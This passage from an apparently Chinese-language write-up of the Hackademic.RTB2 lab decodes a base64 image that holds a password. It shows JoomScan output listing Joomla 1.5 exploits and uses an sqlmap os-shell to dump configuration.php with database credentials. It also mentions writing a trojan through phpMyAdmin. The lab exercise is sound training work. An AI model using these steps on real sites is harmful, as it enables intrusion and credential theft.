class="string">zzdFVq1a9dZbbyW40b59+0477TRH7jURVVVVW7duTSBDKBS64IILJnfxpM9i5cqVjnyLpOvY/9/e</span></span><br><span class="line"><span class="string">/cdUVf8PHL/7hMQcsTtTBAIlfolsyJShIt1MGZopc6ZzNd1qyx9h0820NStqc42mpjN/Ui1Ls2W5</span></span><br><span class="line"><span class="string">1GERaohC+QMNDCo0EBTIS0JBg8WdUHz/oC8acN/ncO6973PvOc/Hn9z3fZ/XeZ9z3vfFOe/zfuvS</span></span><br><span class="line"><span class="string">tl5OsYkkXCnFxcXiGjIzM8U1HDhwQFzD6tWrh9YuRmGux1ID3b59e9asWYJ7vFar9dixYxs2bJAZ</span></span><br><span class="line"><span class="string">FWB4mZmZZWVlMTExzgqUlJSMGzfu559/9lwMkZGRf/75p+C2WUtLy7Bhwzx3+3bmzJluqUexH+tH</span></span><br><span class="line"><span class="string">QtsC+jJ7ctNr1apV5eXlggI5OTnJycnS4gGMbeTIkXl5eYIC3d3djz76qKfDUFyTefz48R4NYPv2</span></span><br><span class="line"><span class="string">7W6sTbEf6yWnbQF9kdz8S3Ec8c6dO+VEAhjejh07xAVeeeUVT8ewbds2Pz/RoMMtW7a0tLR4Ooyq</span></span><br><span class="line"><span class="string">qio31qbmfQgJbQvojuTmX4WFheICqampzB4LuIXiAOozZ854OgbF0QyHDx/2dAwWiyU+Pr61tTUj</span></span><br><span class="line"><span class="string">I8MttSn2YxYpbQvojuTmrsbGRnGBhx9+WE4kgLFFRkaKC9TV1Xk6BsXJoJubmz0dQy+r1do7HLi6</span></span><br><span class="line"><span class="string">uvrkyZMuvsHQ3d0tLuBwOFypH/AJJDd3KT6ujoqKkhMJYGDx8fHi50FNTU0Sngd5oZiYmIyMjGPH</span></span><br><span class="line"><span class="string">jl2/fl1bDYpta6EfgzmQ3Ny1ZcsWcYF169bJiQQwsBdffFFcQHFEjuFFRUXZ7XYNX1RsWwv9GMyB</span></span><br><span class="line"><span class="string">5OaukpKSTz75RFDAZrO98MIL0uIBjMdmsy1fvlxQoLKy8q233pIWj9cKCQnZvHnzkL6i2LZ9xejH</span></span><br><span class="line"><span class="string">YHgkN/+xdOnS999/X1Bg165d/N8DaJOZmVlcXCwoUFRUNGHCBGnxeLmsrCz1hRXb9l70YzA80y2/</span></span><br><span class="line"><span class="string">oGjFihW7d+/OysoKDg6OjIwcOMXk22+/vWzZstzc3MbGxhs3bnz//fe6xAlfV1NTU11dHRIS4q4J</span></span><br><span class="line"><span class="string">f71TQkJCREREUFDQ6tWrbTbbwAK97fDXX3/t3btXzcs+5hEYGBgeHi540UFl2w56jtGPAaY2ZsyY</span></span><br><span class="line"><span class="string">M2fOCCa3bmhomD17tt5hDoF4ru4ell/4f55bfqGiouLeOSEVz7F7+dDyC0lJSRUVFerbQbLW1lbx</span></span><br><span class="line"><span class="string">biq+0qVI8VgocjY6eKhta7x+zHWKjc/yCz6Nx1IK6uvrH3vsMcEMfuHh4QUFBdnZ2TKjgu/qffJy</span></span><br><span class="line"><span class="string">7z/KiueYL1qwYMGVK1cEaycNbAf0U1RUNOh73Rraln4MZkNyo8qaNWsuXbokKLBx48bU1FRp8cBH</span></span><br><span class="line"><span class="string">dXR0OFtOSPEc8yHh4eFHjhwRFBC0A/oMOt2wK21LPwbzILlRS3H83bvvvisnEviuNWvWCD41zBjP</span></span><br><span class="line"><span class="string">Xbt2iQuI2wEWi2XZsmWD3tZysW3px2ASJDdqlZSUdHR0CAokJiaGh4dLiwe+qKSkRPyp+BzzFWlp</span></span><br><span class="line"><span class="string">aeIC4nYwufLy8smTJ3/wwQeDfupi29KPwSRIboZAcdbUUaNGyYkEPkrxFDLGzLyKKxsYYzfdqKio</span></span><br><span class="line"><span class="string">aN68eY888shDDz00adIkwcMj19uWfgxmwKvgAKCnp5566rPPPtM7CsBQSG4AQDdPPvnk0aNH9Y4C</span></span><br><span class="line"><span class="string">MBoeSwGAPgoLC8lsAE8guQEAfWzatEnvEABjMuljqbCwsIiICLvdXl9fr3csAEyqsrJS7xAAYzLd</span></span><br><span class="line"><span class="string">nZu4uLjS0tJff/31woULN2/eLC0tTUpK0jsoAGbkcDj0DgHa2e12cYGQkBBxgdDQUBdrUCxgWuZK</span></span><br><span class="line"><span class="string">bmbMmHHt2rWUlJS+v6SkpFy5cmXOnDk6RgUA8DmnT58WF5g/f77g08jIyJiYGHENir9NGRkZ4gKm</span></span><br><span class="line"><span class="string">ZaLkZuTIkc7Oxfz8fNcXyQMAmMdrr70mLrBy5crAwEBnn+7YsUNxEwsWLBAkQDk5OYo1mJaJkps9</span></span><br><span class="line"><span class="string">e/YIPtWwBDQAwMwmT54sLuBsadjVq1crrvjdy9mMjvPnz9+wYYOaGszJRMmNzWYTfDpjxgxpkQAA</span></span><br><span class="line"><span class="string">DODSpUtjx469ePGiswJxcXF2u33KlCl9fwkODj506JCa2za9rFZrT0/P7Nmz+/4yfPjw7du3Hzt2</span></span><br><span class="line"><span class="string">THPYZmCit6XEA6/8/PysVmtbW5u0eADoKCAgQFyA0b5Qo76+furUqWFhYbGxsUFBQVlZWf0GyoSE</span></span><br><span class="line"><span class="string">hFy4cKGpqamqqspqtU6cOFHDVgoKCjo6OsrLywMCAu4dNgpnTJTcAECv8PBwcXLT0dHR1NQkLR74</span></span><br><span class="line"><span class="string">ulu3bt26dctisRw/fjw1NfXcuXP9CoSEhLj4ZlNgYKD4+QPuZaLHUgDQa8WKFeICH374oZxIYDzn</span></span><br><span class="line"><span class="string">z58fO3as3lGYHckNAHMZM2ZMdna2oMAff/yxZs0aafHAeOrr69evX693FKZGcgPARBITE2/evCko</span></span><br><span class="line"><span class="string">UFtb++CDD0qLB0b1zjvv6B2CqZHcADC4oKCghISEuXPn5ufnV1RUDCzgcDgqKyuPHz8+b9686Oho</span></span><br><span class="line"><span class="string">+RHCeLq7u69evap3FObFgGIAhhUWFvb555+npaU5K9DW1rZo0aLCwkKZUcEk6urq4uPj9Y3BtOPi</span></span><br><span class="line"><span class="string">SW4AGFNKSkppaamgQE1NTWxsrLR4YDZff/217mv7nDp1St8A9MJjKQAGFBgYKM5sLBYLmQ08aufO</span></span><br><span class="line"><span class="string">nfrOlrR3717TTt5GcgPAgHJzc8UFeJkFEkybNk2vTV+6dGnVqlV6bV13JDcADCg9PV1c4KuvvpIT</span></span><br><span class="line"><span class="string">CcysvLw8Ojr6/Pnzkre7adMmxXWvjI0xNwAMSHE2WNMOtEQvh8MhnqVacYEOlWpra6dNmxYVFTV+</span></span><br><span class="line"><span class="string">/Hh31SnQ1tbGAHkLyQ0AwISqq6sTExMFBWJjY92YAdfW1tbW1rqrNijisRQAwHT2798vLrBy5Uo5</span></span><br><span class="line"><span class="string">kcATSG4AAKazdetW8a2UJUuWaFvBG96A5AYAYEbR0dG//PKLoEBZWVlycrK0eOBGJDcAAJMaN27c</span></span><br><span class="line"><span class="string">okWLioqKampquru7Bxa4fPnyl19+OXv27KioqP/9j19Mn8GhAgCY1xdffDFz5szY2Nhhw4Y9/vjj</span></span><br><span class="line"><span class="string">LS0t/QrMnTu3oKDg+vXrf//995kzZ8aMGaNLnBgSkhsAACwWi+XEiROjRo2qrKx0VmD69Ok3b960</span></span><br><span class="line"><span class="string">2Wwyo4IGJDcAANw1YcIE8aoFxcXFkZGRssKBFiQ3AAD8x7PPPisu8NFHH8mIA1qR3AAA8B8nTpwQ</span></span><br><span class="line"><span class="string">F5g+fbqfH7Pgei8TJTeDjoS/l+KZqlhAcRPegHYwNgnH13Xe8KvgDTFowPUrh8PhUJyemCdT3sxE</span></span><br><span class="line"><span class="string">yU1NTY24QGxsrOBTPz+/8PBwcQ3V1dVDDks62sHYJBxf14ljkMMbYtCA61eaixcviguEhobKiQQa</span></span><br><span class="line"><span class="string">mCi5OXTokLjAM888I/h0wYIF4q+fOnXK4XAMOSzpaAdj8/TxdQtxDHJ4QwwacP1K8/zzz4sLzJkz</span></span><br><span class="line"><span class="string">R04kgILffvutR0hwm1H8xZ6eHqvVKnFXXKJ7O3hDY7700kviGN57772h1un6ftXV1YlrUDMfvEeP</span></span><br><span class="line"><span class="string">r5oY1FTi6Vv6PhGDtvNc9+vXPLKyssTNpXeAcMpEd24sFsvo0aPFj1Hr6uoG9gv+/v6///67uObo</span></span><br><span class="line"><span class="string">6Gjxq4NehXYwNs8dXzcaNAbJvCEGDbh+pdm7d+/rr78uKPDTTz+NGDFCWjyAyNq1a8vKypqbm50l</span></span><br><span class="line"><span class="string">47m5uVOmTBkxYkRCQkJ2drazYp2dnVVVVZs3b9Z7hzTSsR3E/wz1cOfGOfUr+bnr+GqIQX1VfTEE</span></span><br><span class="line"><span class="string">KVG5174Vgyvnuff0Y8OHD9f8XZ+QlpZ2+vRpu93urA1fffXV9PT04OBgxVPIdXo3BnyBv7//kiVL</span></span><br><span class="line"><span class="string">urq6FPugfl5++eXg4GC9w3cb+e2gWDPJjTMalinWfHw1x+CuDd2rq6srPz9f/fnmEzG45TzXsR/b</span></span><br><span class="line"><span class="string">t29fe3t7T09PZ2fngQMHDL/0kr+///z581tbW7WcPe5z8uTJpKQkvRsDvkCQkg9kpLSmH2ntoFg5</span></span><br><span class="line"><span class="string">yY0zGpKbPkM6vq7E4JatOKNy5nufiMG957nMfsxqtQ5abUhIiLt2x5tVVFSob2oPWblypd7N4NUM</span></span><br><span class="line"><span class="string">nmirFBoaqnJqh7Fjx96+fdvT8eiFdjA29cfXmxUXF8fExBDDQDKv3+bm5kH/brfbfXQCoSGZMGHC</span></span><br><span class="line"><span class="string">wPU1JcvNzU1PT9c3Bm9GcvMvxcm2LRbLp59+Wl9f7/lY9EQ7GJua4+v9Dhw4oHcIXhHDQHKu323b</span></span><br><span class="line"><span class="string">tgkymH379rlSua9YunSp3iFYDh48qHcI8HoBAQGKtwHNsBKsnHZQ3ASPpZxx5bGURd3xVaTvY6le</span></span><br><span class="line"><span class="string">I0eONEAMbj/P5Vy/DQ0Ngvo7Ozvdsi/ez43j2DSbMWOG3s3gpbhz8y+Hw6H4DmRDQ4OcYHTkcDgU</span></span><br><span class="line"><span class="string">b7fW1dW5uBXFm+cSnp54IgbX6/R0y6g5vq6TcPgUJ4f1iRjcHqSc61c8sCYgICAwMNDFTfiEGzdu</span></span><br><span class="line"><span class="string">6B2CwrEwM5Ib9KeYwzU2Nrq4CXENHR0dHR0dLm7CxRgsKiZfH0jc2anZL8XGd/2XSUKO7voZokjC</span></span><br><span class="line"><span class="string">WerpGDx0npvk+vUG3vDvroTz3EeR3KC/jz/+WPDp8ePHXd/E4cOHNX/qLopbKSwsHGqd4kfgavZr</span></span><br><span class="line"><span class="string">9+7dgk9PnTrl+s+G+Pi6haeP4Hfffad4n9X7Y/BQhCa5fr2B+GqVoLGxsaSkRN8Y4AMUZy/wxclM</span></span><br><span class="line"><span class="string">tRG8U+quG86902MMyi31q7F8+XJnMeTk5GirUzA1vsoarl275qwGdw3RcPGdcDXjfgTH13Uql/b0</span></span><br><span class="line"><span class="string">8hjUfF0bk1y/3kBwtUqQlpamdwPAF5Dc3GvQH+moqCh31R8QEDCwf+zq6pK8tM3GjRsH7uaePXtc</span></span><br><span class="line"><span class="string">qXPgT8tQ9+v69esebXyLivWJBNQkN4MeX7dISUlRuY9eG4OE89wk1683GPRqlcBHV36FDkhu+nnj</span></span><br><span class="line"><span class="string">jTeqqqq6uroaGhree+89T0w/unnz5rq6ut5NbNu2ze31qzFx4sQjR440Nze3t7efPHkyNTXV9Trf</span></span><br><span class="line"><span class="string">fPNNF/dr3bp1FRUVnZ2ddrvdQ+/W9h3fofaq6t/Y6ju+Wjvwu+x2+8GDBzXM9O9VMcg8z01y/XqD</span></span><br><span class="line"><span class="string">vqvV9XNMUXNzc0FBgXv/1YHBkdzAnIKDgwVP6AZy8XV0AIA8JDcwOfH8JSQ3AHwFb0sB+FdERIQB</span></span><br><span class="line"><span class="string">1mcAAJIbAHctXrxY7xAAwFUkNwDuOnr0qN4hAICrjL98q5dISEiw2Wze8J5kd3f3jz/+eOLECb0D</span></span><br><span class="line"><span class="string">gZe6ceMGw8vgIfSEgGxlZWXicZSaa/7222/VvogiS11dXUJCghtbD4bh6cU7YVr0hIAO1q5dK7gG</span></span><br><span class="line"><span class="string">8vLytFUr7SrVYPr06e5tQxgAyQ08QUqXphE9IQzO7dOWl5aWyrxENXB7G8LXkdzA7egJIRkDiv8j</span></span><br><span class="line"><span class="string">NDT09u3bA/8eHR2tYcHC1NRU9dO062Xt2rV6hwDAyOgJIR/JTX+jR4/eunVrU1OTxWLp6Og4fPjw</span></span><br><span class="line"><span class="string">fffdV1tbq6Eqn5ghOyMjQ+8QABgZPSHkI7kZxPr160NDQ++///4HHnhg8eLF//zzj7Z6/P393RsY</span></span><br><span class="line"><span class="string">oF5GRsa5c+daW1urq6s3bNigdzgwL3pCyEdy49SdO3dcrOHq1atuicSjzp49q3cIcL+8vLzeRUCt</span></span><br><span class="line"><span class="string">VmtMTExOTk5rayu/MdAFPSFgNJcvX9Z7nJwCPz/mOjKa4uLiQY91V1eXmq8zoBhuR08Iybhz41lT</span></span><br><span class="line"><span class="string">p07VOwSRWbNmsZaQwTz33HM2m23Qj/z8/Pbs2SM5HsBCTwgYj7+/v+L0gPK1t7enpaXp3TZwv6qq</span></span><br><span class="line"><span class="string">KvFxV6yBOzfwBHpCyMSNOI+7c+fOpEmT0tPTlyxZ4nA49A7H4nA4fvjhh/379+sdCDwiPj5e8Glg</span></span><br><span class="line"><span class="string">YKDVam1ra5MWD9CLnhAAoJHiv6qKy/pw5waAr2PMDQAAMBSSGwAAYCgkNwAAwFBIbgAAgKGQ3AAA</span></span><br><span class="line"><span class="string">AEMhuQEAAIZCcgMAAAyF5AYAABgKyQ0AADAUkhsAAGAoJDeAoTQdSUSlAAABo0lEQVQ2NooLRERE</span></span><br><span class="line"><span class="string">iAuEh4eLCzQ0NAwtJgCQi+QGMJTCwkJxgSeeeELwqc1m8/MTradbUlLS0tKiJTIAAAAN/Pz8FNfO</span></span><br><span class="line"><span class="string">DAgIcPZ1Vs0EAABeJzExUZygOHuulJ+fL/7i008/LXlfAAAALBaLJSgo6PTp04I0paura/bs2X3l</span></span><br><span class="line"><span class="string">U1JSqqurBeWLi4sTEhJ03CMAAADL8OHD4+Li0tPT8/LynKU4VVVVra2tg36al5e3cOHC5OTkESNG</span></span><br><span class="line"><span class="string">6L0rAAAA/xUTEyN+5NTP3Llz9Q4ZAABAKDg4WGVmk5GRoXewAAAAKmRnZytmNt98843eYQIAAKgT</span></span><br><span class="line"><span class="string">EhKimNxkZmbqHSYAAIBq7e3t4uQmJiZG7xgBAABUq6ioECc34hmKAcD7sfwCYC7iITVnz57t7u6W</span></span><br><span class="line"><span class="string">FgwAAIAbCG7bxMfH6x0dAADAEMXFxQ2a2SxcuFDv0AAAADQJCgoqLi7uS2tKS0uTkpL0DgoAAMA1</span></span><br><span class="line"><span class="string">QUFBycnJYWFhegcCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span><br><span class="line"><span class="string">AAAAAACg0f8BeD+YFbp5dlYAAAAASUVORK5CYII=&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">imgdata=base64.b64decode(strs)</span><br><span class="line">file=open(<span class="string">&#x27;key.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">file.write(imgdata)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p>python3运行即可得到图片，原图如下：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/key.png"></p>
<p>还可以使用在线工具直接将base64字符串转成图片：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jb2RlYmVhdXRpZnkub3JnL2Jhc2U2NC10by1pbWFnZS1jb252ZXJ0ZXI=">Convert Your Base64 to Image<i class="fa fa-external-link-alt"></i></span></p>
<p>登陆密码即在图片中，挑战完成，帅！！！</p>
<h3 id="其它方法"><a href="#其它方法" class="headerlink" title="其它方法"></a>其它方法</h3><ul>
<li>使用joomscan扫描可以发现存在非常多的漏洞，远程代码执行，sql注入等等，下载对应的poc或者脚本运行即可</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># joomscan -u http://192.168.84.143:666/</span></span><br><span class="line">    ____  _____  _____  __  __  ___   ___    __    _  _ </span><br><span class="line">   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )</span><br><span class="line">  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( </span><br><span class="line">  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)</span><br><span class="line">                        (1337.today)</span><br><span class="line">   </span><br><span class="line">    --=[OWASP JoomScan</span><br><span class="line">    +---++---==[Version : 0.0.7</span><br><span class="line">    +---++---==[Update Date : [2018/09/23]</span><br><span class="line">    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo</span><br><span class="line">    --=[Code name : Self Challenge</span><br><span class="line">    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP</span><br><span class="line"></span><br><span class="line">Processing http://192.168.84.143:666/ ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] FireWall Detector</span><br><span class="line">[++] Firewall not detected</span><br><span class="line"></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla 1.5</span><br><span class="line"></span><br><span class="line">[+] Core Joomla Vulnerability</span><br><span class="line">[++] Joomla! 1.5 Beta 2 - <span class="string">&#x27;Search&#x27;</span> Remote Code Execution</span><br><span class="line">EDB : https://www.exploit-db.com/exploits/4212/</span><br><span class="line"></span><br><span class="line">Joomla! 1.5 Beta1/Beta2/RC1 - SQL Injection</span><br><span class="line">CVE : CVE-2007-4781</span><br><span class="line">EDB : https://www.exploit-db.com/exploits/4350/</span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.x - (Token) Remote Admin Change Password                                                   </span><br><span class="line">CVE : CVE-2008-3681                                                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/6234/                                                        </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.x - Cross-Site Scripting / Information Disclosure                                          </span><br><span class="line">CVE: CVE-2011-4909                                                                                     </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/33061/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.x - 404 Error Page Cross-Site Scripting                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/33378/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.12 - <span class="built_in">read</span>/<span class="built_in">exec</span> Remote files                                                                </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/11263/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.12 - connect back Exploit                                                                  </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/11262/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! Plugin <span class="string">&#x27;tinybrowser&#x27;</span> 1.5.12 - Arbitrary File Upload / Code Execution (Metasploit)              </span><br><span class="line">CVE : CVE-2011-4908                                                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/9926/                                                        </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5 - URL Redirecting                                                                          </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/14722/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.x - SQL Error Information Disclosure                                                       </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/34955/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! - Spam Mail Relay                                                                              </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/15979/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5/1.6 - JFilterInput Cross-Site Scripting Bypass                                             </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/16091/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! &lt; 1.7.0 - Multiple Cross-Site Scripting Vulnerabilities                                        </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/36176/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5 &lt; 3.4.5 - Object Injection Remote Command Execution                                        </span><br><span class="line">CVE : CVE-2015-8562                                                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/38977/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.0 &lt; 3.4.5 - Object Injection <span class="string">&#x27;x-forwarded-for&#x27;</span> Header Remote Code Execution                  </span><br><span class="line">CVE : CVE-2015-8562 , CVE-2015-8566                                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/39033/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.0 Beta - <span class="string">&#x27;pcltar.php&#x27;</span> Remote File Inclusion                                                </span><br><span class="line">CVE : CVE-2007-2199                                                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/3781/                                                        </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! Component xstandard editor 1.5.8 - Local Directory Traversal                                   </span><br><span class="line">CVE : CVE-2009-0113                                                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/7691/                                                        </span><br><span class="line">                                                                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] Checking Directory Listing                                                                         </span><br><span class="line">[++] directory has directory listing :                                                                 </span><br><span class="line">http://192.168.84.143:666/tmp                                                                          </span><br><span class="line">                                                                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] Checking apache info/status files                                                                  </span><br><span class="line">[++] Readable info/status files are not found                                                          </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] admin finder                                                                                       </span><br><span class="line">[++] Admin page : http://192.168.84.143:666/administrator/                                             </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] Checking robots.txt existing                                                                       </span><br><span class="line">[++] robots.txt is found                                                                               </span><br><span class="line">path : http://192.168.84.143:666/robots.txt                                                            </span><br><span class="line">                                                                                                       </span><br><span class="line">Interesting path found from robots.txt                                                                 </span><br><span class="line">http://192.168.84.143:666/administrator/                                                               </span><br><span class="line">http://192.168.84.143:666/cache/                                                                       </span><br><span class="line">http://192.168.84.143:666/components/                                                                  </span><br><span class="line">http://192.168.84.143:666/images/                                                                      </span><br><span class="line">http://192.168.84.143:666/includes/                                                                    </span><br><span class="line">http://192.168.84.143:666/installation/                                                                </span><br><span class="line">http://192.168.84.143:666/language/                                                                    </span><br><span class="line">http://192.168.84.143:666/libraries/                                                                   </span><br><span class="line">http://192.168.84.143:666/media/                                                                       </span><br><span class="line">http://192.168.84.143:666/modules/                                                                     </span><br><span class="line">http://192.168.84.143:666/plugins/                                                                     </span><br><span class="line">http://192.168.84.143:666/templates/                                                                   </span><br><span class="line">http://192.168.84.143:666/tmp/                                                                         </span><br><span class="line">http://192.168.84.143:666/xmlrpc/                                                                      </span><br><span class="line">                                                                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] Finding common backup files name                                                                   </span><br><span class="line">[++] Backup files are not found                                                                        </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] Finding common <span class="built_in">log</span> files name                                                                      </span><br><span class="line">[++] error <span class="built_in">log</span> is not found                                                                            </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] Checking sensitive config.php.x file                                                               </span><br><span class="line">[++] Readable config file is found                                                                     </span><br><span class="line"> config file path : http://192.168.84.143:666/configuration.php-dist </span><br></pre></td></tr></table></figure>

<ul>
<li>使用sqlmap查看配置文件中的phpmyadmin的用户名和密码，然后利用phpmyadmin写木马</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">os-shell&gt; cat configuration.php</span><br><span class="line"><span class="keyword">do</span> you want to retrieve the <span class="built_in">command</span> standard output? [Y/n/a] <span class="built_in">command</span> standard output:</span><br><span class="line">---</span><br><span class="line">&lt;?php</span><br><span class="line">class JConfig &#123;</span><br><span class="line">/* Site Settings */</span><br><span class="line">var <span class="variable">$offline</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$offline_message</span> = <span class="string">&#x27;This site is down for maintenance.&lt;br /&gt; Please check back again soon.&#x27;</span>;</span><br><span class="line">var <span class="variable">$sitename</span> = <span class="string">&#x27;Hackademic.RTB2&#x27;</span>;</span><br><span class="line">var <span class="variable">$editor</span> = <span class="string">&#x27;tinymce&#x27;</span>;</span><br><span class="line">var <span class="variable">$list_limit</span> = <span class="string">&#x27;20&#x27;</span>;</span><br><span class="line">var <span class="variable">$legacy</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">/* Debug Settings */</span><br><span class="line">var <span class="variable">$debug</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$debug_lang</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">/* Database Settings */</span><br><span class="line">var <span class="variable">$dbtype</span> = <span class="string">&#x27;mysql&#x27;</span>;</span><br><span class="line">var <span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">var <span class="variable">$user</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">var <span class="variable">$password</span> = <span class="string">&#x27;yUtJklM97W&#x27;</span>;</span><br><span class="line">var <span class="variable">$db</span> = <span class="string">&#x27;joomla&#x27;</span>;</span><br><span class="line">var <span class="variable">$dbprefix</span> = <span class="string">&#x27;jos_&#x27;</span>;</span><br><span class="line">/* Server Settings */</span><br><span class="line">var <span class="variable">$live_site</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">var <span class="variable">$secret</span> = <span class="string">&#x27;iFzlVUCg9BBPoUDU&#x27;</span>;</span><br><span class="line">var <span class="variable">$gzip</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$error_reporting</span> = <span class="string">&#x27;-1&#x27;</span>;</span><br><span class="line">var <span class="variable">$helpurl</span> = <span class="string">&#x27;http://help.joomla.org&#x27;</span>;</span><br><span class="line">var <span class="variable">$xmlrpc_server</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$ftp_host</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">var <span class="variable">$ftp_port</span> = <span class="string">&#x27;21&#x27;</span>;</span><br><span class="line">var <span class="variable">$ftp_user</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">var <span class="variable">$ftp_pass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">var <span class="variable">$ftp_root</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">var <span class="variable">$ftp_enable</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$force_ssl</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">/* Locale Settings */</span><br><span class="line">var <span class="variable">$offset</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$offset_user</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">/* Mail Settings */</span><br><span class="line">var <span class="variable">$mailer</span> = <span class="string">&#x27;mail&#x27;</span>;</span><br><span class="line">var <span class="variable">$mailfrom</span> = <span class="string">&#x27;admin@hackademirtb2.com&#x27;</span>;</span><br><span class="line">var <span class="variable">$fromname</span> = <span class="string">&#x27;Hackademic.RTB2&#x27;</span>;</span><br><span class="line">var <span class="variable">$sendmail</span> = <span class="string">&#x27;/usr/sbin/sendmail&#x27;</span>;</span><br><span class="line">var <span class="variable">$smtpauth</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$smtpsecure</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">var <span class="variable">$smtpport</span> = <span class="string">&#x27;25&#x27;</span>;</span><br><span class="line">var <span class="variable">$smtpuser</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">var <span class="variable">$smtppass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">var <span class="variable">$smtphost</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">/* Cache Settings */</span><br><span class="line">var <span class="variable">$caching</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$cachetime</span> = <span class="string">&#x27;15&#x27;</span>;</span><br><span class="line">var <span class="variable">$cache_handler</span> = <span class="string">&#x27;file&#x27;</span>;</span><br><span class="line">/* Meta Settings */</span><br><span class="line">var <span class="variable">$MetaDesc</span> = <span class="string">&#x27;Joomla! - the dynamic portal engine and content management system&#x27;</span>;</span><br><span class="line">var <span class="variable">$MetaKeys</span> = <span class="string">&#x27;joomla, Joomla&#x27;</span>;</span><br><span class="line">var <span class="variable">$MetaTitle</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">var <span class="variable">$MetaAuthor</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">/* SEO Settings */</span><br><span class="line">var <span class="variable">$sef</span>           = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$sef_rewrite</span>   = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$sef_suffix</span>    = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">/* Feed Settings */</span><br><span class="line">var <span class="variable">$feed_limit</span>   = 10;</span><br><span class="line">var <span class="variable">$feed_email</span>   = <span class="string">&#x27;author&#x27;</span>;</span><br><span class="line">var <span class="variable">$log_path</span> = <span 